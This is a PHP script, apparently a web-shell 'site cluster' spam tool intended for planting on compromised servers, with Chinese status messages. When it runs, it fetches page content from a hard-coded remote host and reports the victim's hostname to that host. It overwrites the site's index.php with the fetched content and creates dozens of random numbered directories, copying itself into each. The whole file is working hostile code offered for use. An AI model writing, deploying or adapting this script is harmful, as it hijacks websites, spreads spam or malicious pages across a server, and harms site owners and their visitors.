<?php
header("Content-Type: text/html;charset=gb2312");
$Remote_server = "http://web.45677789.com/"; 
$directory_Number=50; 
$Branch_directory_1=getCode(mt_rand(4,4));
$Branch_directory_2=getCode(mt_rand(4,4));
$Branch_directory_3=getCode(mt_rand(4,4));
$Branch_directory_4=getCode(mt_rand(4,4));
$Branch_directory_5=getCode(mt_rand(4,4));
$Branch_directory_6=getCode(mt_rand(4,4));
$Branch_directory_7=getCode(mt_rand(4,4));
$Branch_directory_8=getCode(mt_rand(4,4));
$Branch_directory_9=getCode(mt_rand(4,4));
$Branch_directory_10=getCode(mt_rand(4,4));
$Branch_directory_11=getCode(mt_rand(4,4));
$Branch_directory_12=getCode(mt_rand(4,4));
$Branch_directory_13=getCode(mt_rand(4,4));
$Branch_directory_14=getCode(mt_rand(4,4));
$Branch_directory_15=getCode(mt_rand(4,4));
$Branch_directory_16=getCode(mt_rand(4,4));
$Branch_directory_17=getCode(mt_rand(4,4));
$Branch_directory_18=getCode(mt_rand(4,4));
$Branch_directory_19=getCode(mt_rand(4,4));
$Branch_directory_20=getCode(mt_rand(4,4));
$Branch_directory_21=getCode(mt_rand(4,4));
$Branch_directory_22=getCode(mt_rand(4,4));
$Branch_directory_23=getCode(mt_rand(4,4));
$Branch_directory_24=getCode(mt_rand(4,4));
$Branch_directory_25=getCode(mt_rand(4,4));
$Branch_directory_26=getCode(mt_rand(4,4));
$Branch_directory_27=getCode(mt_rand(4,4));
$Branch_directory_28=getCode(mt_rand(4,4));
$Branch_directory_29=getCode(mt_rand(4,4));
$Branch_directory_30=getCode(mt_rand(4,4));
$Branch_directory_31=getCode(mt_rand(4,4));
$Branch_directory_32=getCode(mt_rand(4,4));
$Branch_directory_33=getCode(mt_rand(4,4));
$Branch_directory_34=getCode(mt_rand(4,4));
$Branch_directory_35=getCode(mt_rand(4,4));
$Branch_directory_36=getCode(mt_rand(4,4));
$Branch_directory_37=getCode(mt_rand(4,4));
$Branch_directory_38=getCode(mt_rand(4,4));
$Branch_directory_39=getCode(mt_rand(4,4));
$Branch_directory_40=getCode(mt_rand(4,4));
$Branch_directory_41=getCode(mt_rand(4,4));
$Branch_directory_42=getCode(mt_rand(4,4));
$Branch_directory_43=getCode(mt_rand(4,4));
$Branch_directory_44=getCode(mt_rand(4,4));
$Branch_directory_45=getCode(mt_rand(4,4));
$Branch_directory_46=getCode(mt_rand(4,4));
$Branch_directory_47=getCode(mt_rand(4,4));
$Branch_directory_48=getCode(mt_rand(4,4));
$Branch_directory_49=getCode(mt_rand(4,4));
$Branch_directory_50=getCode(mt_rand(4,4));


$Branch_directory = $Branch_directory_1.".".$Branch_directory_2.".".$Branch_directory_3.".".$Branch_directory_4.".".$Branch_directory_5.".".$Branch_directory_6.".".$Branch_directory_7.".".$Branch_directory_8.".".$Branch_directory_9.".".
$Branch_directory_10.".".
$Branch_directory_11.".".
$Branch_directory_12.".".
$Branch_directory_13.".".
$Branch_directory_14.".".
$Branch_directory_15.".".
$Branch_directory_16.".".
$Branch_directory_17.".".
$Branch_directory_18.".".
$Branch_directory_19.".".
$Branch_directory_20.".".
$Branch_directory_21.".".
$Branch_directory_22.".".
$Branch_directory_23.".".
$Branch_directory_24.".".
$Branch_directory_25.".".
$Branch_directory_26.".".
$Branch_directory_27.".".
$Branch_directory_28.".".
$Branch_directory_29.".".
$Branch_directory_30.".".
$Branch_directory_31.".".
$Branch_directory_32.".".
$Branch_directory_33.".".
$Branch_directory_34.".".
$Branch_directory_35.".".
$Branch_directory_36.".".
$Branch_directory_37.".".
$Branch_directory_38.".".
$Branch_directory_39.".".
$Branch_directory_40.".".
$Branch_directory_41.".".
$Branch_directory_42.".".
$Branch_directory_43.".".
$Branch_directory_44.".".
$Branch_directory_45.".".
$Branch_directory_46.".".
$Branch_directory_47.".".
$Branch_directory_48.".".
$Branch_directory_49.".".
$Branch_directory_50;

$NewFile_content = getFileCont("index.php");

if (empty($NewFile_content)) {
	exit("<p align='center'><font color='red'><b>SHELL站群页面在生成中稍等......</b></font></p>");
}

$ml = $_SERVER['REQUEST_URI'];
$str= explode("/", $ml);
$Quantity = count($str)-1; //层数

$caonima_name = str_replace("index.php", "", "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']);

if ($Quantity<5 && $Quantity>0) {

	$Remote_directory = $Remote_server."/directory.php?type=index.php&caonima=".$caonima_name."&directory=".$Branch_directory;
	$Content_directory = getHTTPPage($Remote_directory);	

	$Content_mb=GetHtml($Remote_server."/index.php?type=index.php&caonima=".$caonima_name);
	$Branch_directory= explode(".",$Branch_directory);

	echo $Content_mb;

	for ($i=0;$i < count($Branch_directory); $i++) {
		$check = CFolder("./".$Branch_directory[$i]."/");
		if ($check == 1) {
			WriteIn("./".$Branch_directory[$i]."/index.php",$NewFile_content);
		}
	}

	WriteIn("./index.php",$Content_mb);
	chmod("index.php",0644);

	echo "<meta http-equiv='refresh' content='0; url=index.php'>";
	exit();

} else {
	$Content_mb=GetHtml($Remote_server."/index.php?type=index.php&caonima=".$caonima_name);
	WriteIn("./index.php",$Content_mb);
	chmod("index.php",0755);

	header("Location: index.php");
	exit();
}  

function getCode($iCount) {//取随机混合字母数字    
	$arrChar = "0123456789";
	$code="";
    for ( $i = 0; $i < $iCount; $i++ )  
	{ 
		$code .= $arrChar[ mt_rand(0, strlen($arrChar) - 1) ];  
	}  
	return $code; 
}

function Digital($iCount) {//取随机数字
    $arrChar = "0123456789";
	$code="";
    for ( $i = 0; $i < $iCount; $i++ )  
	{ 
		$code .= $arrChar[ mt_rand(0, strlen($arrChar) - 1) ];  
	}  
	return $code; 
}

function sj_int($min, $max) { //取随机数字
	return mt_rand($min, $max);
}

function WriteIn($testfile, $msg) {
	if (empty($msg)) {
		echo "内容为空";
		return;
	}
	
	$fp = @fopen($testfile,"w");
	fwrite($fp,$msg);
	fclose($fp);
}

function getFileCont($testfile) {
	$restr = '';
	$fp = @fopen($testfile,"r");
	if ($fp) {
		while($line=fgets($fp,1024)) $restr.=$line;
		fclose($fp);
	}
	return $restr;
}

function CFolder($Filepath) {
  if (!file_exists($Filepath)) {
	mkdir($Filepath, 0755);
	return 1;
  }
  return 0;
}

function getHTTPPage($url) {
	$opts = array(
	  'http'=>array(
		'method'=>"GET",
		'header'=>"User-Agent: aQ0O010O"
	  )
	);

	$context = stream_context_create($opts);

	$html = @file_get_contents($url, false, $context);
	if (empty($html)) {
		exit("<p align='center'><font color='red'><b>服务器获取文件内容出错</b></font></p>");
	}
	
	return $html;
} 

function GetHtml($url) {
	return getHTTPPage($url);
}

